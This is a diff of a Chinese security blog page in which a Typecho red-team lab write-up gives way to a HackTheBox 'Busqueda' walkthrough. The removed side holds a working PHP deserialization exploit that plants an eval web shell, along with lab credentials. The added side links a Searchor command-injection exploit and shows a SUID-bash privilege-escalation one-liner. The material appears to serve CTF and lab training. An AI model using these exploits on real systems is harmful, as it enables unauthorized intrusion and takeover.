@@ -21,39 +21,46 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"syst1m.top","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="环境配置 首先是WEB它有3个快照分别对应的是iis、weblogic、typechoCMS接着是linux就开放了一个22端口，服务嘛啥也没有 123V3.2web\de1ay | 1qaz!QAZ1qaz!QAZde1ay\de2ay | 1qaz@WSX!QAZ2wsx    首先要进入web靶机启动phpstudy，它这里ip是写死的静态ip，如果要修改需要进入web\de1ay账号修改i">
+    <meta name="description" content="信息收集拿到靶机ip先nmap扫描下  开放80 22 看下web,输入ip跳转到这个域名">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ATT-CK红队实战靶场06">
-<meta property="og:url" content="https://syst1m.top/2022/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA06/index.html">
+<meta property="og:title" content="htb打靶-Busqueda">
+<meta property="og:url" content="https://syst1m.top/2023/07/14/htb%E6%89%93%E9%9D%B6-Busqueda/index.html">
 <meta property="og:site_name" content="Syst1m">
-<meta property="og:description" content="环境配置 首先是WEB它有3个快照分别对应的是iis、weblogic、typechoCMS接着是linux就开放了一个22端口，服务嘛啥也没有 123V3.2web\de1ay | 1qaz!QAZ1qaz!QAZde1ay\de2ay | 1qaz@WSX!QAZ2wsx    首先要进入web靶机启动phpstudy，它这里ip是写死的静态ip，如果要修改需要进入web\de1ay账号修改i">
+<meta property="og:description" content="信息收集拿到靶机ip先nmap扫描下  开放80 22 看下web,输入ip跳转到这个域名">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202208231614969.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202208231618206.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202208231625116.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202208231627616.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202208231707526.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202208231716241.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202208231718366.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202208231719352.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202208231810645.png">
-<meta property="article:published_time" content="2022-08-23T08:04:30.000Z">
-<meta property="article:modified_time" content="2022-08-25T08:54:38.000Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141419677.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141420082.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141421710.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141423784.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141425877.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141430225.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141434247.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141435278.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141445541.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141446056.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141650653.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141653662.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141655480.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141704830.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141709406.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141720958.png">
+<meta property="article:published_time" content="2023-07-14T05:58:40.000Z">
+<meta property="article:modified_time" content="2023-07-14T09:35:44.355Z">
 <meta property="article:author" content="Syst1m">
-<meta property="article:tag" content="ATT&amp;CK">
-<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="hackthebox">
+<meta property="article:tag" content="域渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/chencicici/images/main/202208231614969.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/chencicici/images/main/202307141419677.png">
 
 
-<link rel="canonical" href="https://syst1m.top/2022/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA06/">
+<link rel="canonical" href="https://syst1m.top/2023/07/14/htb%E6%89%93%E9%9D%B6-Busqueda/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2022/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA06/","path":"2022/08/23/ATT-CK红队实战靶场06/","title":"ATT-CK红队实战靶场06"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2023/07/14/htb%E6%89%93%E9%9D%B6-Busqueda/","path":"2023/07/14/htb打靶-Busqueda/","title":"htb打靶-Busqueda"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>ATT-CK红队实战靶场06 | Syst1m</title>
+<title>htb打靶-Busqueda | Syst1m</title>
   
 
 
@@ -156,7 +163,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">外网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E5%8F%B0getshell"><span class="nav-number">2.1.</span> <span class="nav-text">typecho反序列化前台getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">3.</span> <span class="nav-text">内网渗透</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exp"><span class="nav-number">2.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -254,7 +261,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2022/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA06/">
+    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2023/07/14/htb%E6%89%93%E9%9D%B6-Busqueda/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/IMG_0010.JPG">
@@ -267,12 +274,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="ATT-CK红队实战靶场06 | Syst1m">
+      <meta itemprop="name" content="htb打靶-Busqueda | Syst1m">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          ATT-CK红队实战靶场06
+          htb打靶-Busqueda
         </h1>
 
         <div class="post-meta-container">
@@ -282,15 +289,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2022-08-23 16:04:30" itemprop="dateCreated datePublished" datetime="2022-08-23T16:04:30+08:00">2022-08-23</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-08-25 16:54:38" itemprop="dateModified" datetime="2022-08-25T16:54:38+08:00">2022-08-25</time>
+      <time title="创建时间：2023-07-14 13:58:40 / 修改时间：17:35:44" itemprop="dateCreated datePublished" datetime="2023-07-14T13:58:40+08:00">2023-07-14</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -319,34 +320,40 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231614969.png"></p>
-<p>首先是WEB它有3个快照分别对应的是iis、weblogic、typechoCMS<br>接着是linux就开放了一个22端口，服务嘛啥也没有</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V<span class="number">3.2</span></span><br><span class="line">web\de<span class="number">1</span>ay | <span class="number">1</span>qaz<span class="title">!QAZ1qaz</span><span class="title">!QAZ</span></span><br><span class="line">de<span class="number">1</span>ay\de<span class="number">2</span>ay | <span class="number">1</span>qaz<span class="title">@WSX</span><span class="title">!QAZ2wsx</span></span><br></pre></td></tr></table></figure>
+        <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>拿到靶机ip先nmap扫描下</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141419677.png" alt="image-20230714141955637"></p>
+<p>开放80 22 看下web,输入ip跳转到这个域名</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141420082.png" alt="image-20230714142038037"></p>
+<p>添加下域名解析</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141421710.png" alt="image-20230714142152680"></p>
+<p>正常访问</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141423784.png" alt="image-20230714142321734"></p>
+<p>大致意思是,输入搜索内容,随便输入,返回url</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141425877.png" alt="image-20230714142547846"></p>
+<p>跳转到一个新的网站,没什么用,扫下目录,没发现东西</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141430225.png" alt="image-20230714143016191"></p>
+<p>探测下cms,flask的一个框架</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141434247.png" alt="image-20230714143430215"></p>
+<p>网站首页下方</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141435278.png" alt="image-20230714143536245"></p>
+<p>寻找exp,找到一个利用<a target="_blank" rel="noopener" href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection">https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection</a> 一个rce</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>一发入魂,返回shell,这里ip是自己攻击机的ip</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141445541.png" alt="image-20230714144549508"></p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141446056.png" alt="image-20230714144612028"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>sudo -l,因为是反弹的shell,需要加-S,提示我们要密码</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141650653.png" alt="image-20230714165010614"></p>
+<p>找到一个隐藏目录,在config文件中撞出密码</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141653662.png" alt="image-20230714165352629"></p>
+<p>找到一个sui权限的python文件,但是没有查看权限,通过名字可以得知是系统检查</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141655480.png" alt="image-20230714165556425"></p>
+<p>反弹的shell不太方便,直接ssh上去,运行这个脚本</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141704830.png" alt="image-20230714170436776"></p>
+<p>提示需要参数,带入参数执行</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141709406.png" alt="image-20230714170908350"></p>
+<p>参数名和当前目录下一个文件名相同,有可能是调用了这个full-check.sh文件,我们创建一个自己的full-checkup.sh试试,切换到tmp目录,但是在执行的时候一直报错,文件会被删除</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141720958.png" alt="image-20230714172000899"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> full-checkup.sh&amp;&amp;<span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;&gt; full-checkup.sh&amp;&amp;<span class="built_in">chmod</span> +x full-checkup.sh&amp;&amp;sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</span><br></pre></td></tr></table></figure>
 
-
-
-<p>首先要进入web靶机启动phpstudy，它这里ip是写死的静态ip，如果要修改需要进入web\de1ay账号修改ip设置</p>
-<p>扫下端口开放情况，只开发了80,3306，这里的80使用phpstudy起的一个typecho</p>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231618206.png"></p>
-<p>打开发现报错</p>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231625116.png"></p>
-<p>进入靶机打开phpstudy启动服务，先关闭iis，在删除网站根目录的config.inc.php，重新安装typecho，先进入数据库新建一个typecho的库，然后访问如下url，进行重新安装</p>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231627616.png"></p>
-<p>然后又报了一个类错误，直接从官网从新下一个，2017年10月24日之前的所有版本都存在此靶场要利用的漏洞</p>
-<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="typecho反序列化前台getshell"><a href="#typecho反序列化前台getshell" class="headerlink" title="typecho反序列化前台getshell"></a>typecho反序列化前台getshell</h2><p>exp</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;echo ^&lt;?php @eval($_POST[&quot;b1ank&quot;]);?^&gt;&gt;shell.php&#x27;</span>; <span class="comment">// 执行的参数值</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;system&#x27;</span>; <span class="comment">//filter执行的函数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">RSS2</span> = <span class="string">&#x27;RSS 2.0&#x27;</span>; <span class="comment">//进入toString内部判断条件</span></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_type = <span class="built_in">self</span>::<span class="variable constant_">RSS2</span>;</span><br><span class="line">            <span class="variable">$_item</span>[<span class="string">&#x27;author&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">Typecho_Request</span>(); <span class="comment">//Feed.php文件中触发__get()方法使用的对象</span></span><br><span class="line">        <span class="variable">$_item</span>[<span class="string">&#x27;category&#x27;</span>] = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Typecho_Request</span>());<span class="comment">//触发错误</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="variable">$_item</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Feed</span>();</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;adapter&#x27;</span>=&gt;<span class="variable">$exp</span>, <span class="comment">// Db.php文件中触发__toString()使用的对象</span></span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span> =&gt;<span class="string">&#x27;typecho_&#x27;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>用post提交数据<br>url：<a target="_blank" rel="noopener" href="http://192.168.31.10/typecho/install.php?finish=a">http://192.168.31.10/typecho/install.php?finish=a</a><br>Postdata：__typecho_config&#x3D;前面脚本生成的<br>Referrer：<a target="_blank" rel="noopener" href="http://192.168.31.10/typecho">http://192.168.31.10/typecho</a></p>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231707526.png"></p>
-<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>连上蚁剑，上线到cs提权</p>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231716241.png"></p>
-<p>信息收集发现还有一个网段</p>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231718366.png"></p>
-<p>探测10网段存活主机</p>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231719352.png"></p>
-<p>看很多文章后面就是mimikatz抓取明文密码，然后域横向，但是我这里mimikatz根本没有抓到明文密码</p>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231810645.png"></p>
-<p>这个环境没搞懂，应该还有很多内容，没这么简单的</p>
 
     </div>
 
@@ -366,7 +373,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://syst1m.top/2022/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA06/" title="ATT-CK红队实战靶场06">https://syst1m.top/2022/08/23/ATT-CK红队实战靶场06/</a>
+      <a href="https://syst1m.top/2023/07/14/htb%E6%89%93%E9%9D%B6-Busqueda/" title="htb打靶-Busqueda">https://syst1m.top/2023/07/14/htb打靶-Busqueda/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -375,22 +382,19 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/ATT-CK/" rel="tag"># ATT&CK</a>
-              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+              <a href="/tags/hackthebox/" rel="tag"># hackthebox</a>
+              <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag"># 域渗透</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/08/19/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA05/" rel="prev" title="ATT-CK红队实战靶场05">
-                  <i class="fa fa-chevron-left"></i> ATT-CK红队实战靶场05
+                <a href="/2023/07/06/%E8%81%94%E5%8A%A8%E5%A5%97%E5%A8%83%E6%8C%96%E6%B4%9Ebp-awvs-xray/" rel="prev" title="联动套娃挖洞bp+awvs+xray">
+                  <i class="fa fa-chevron-left"></i> 联动套娃挖洞bp+awvs+xray
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/08/25/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA07/" rel="next" title="ATT-CK红队实战靶场07">
-                  ATT-CK红队实战靶场07 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
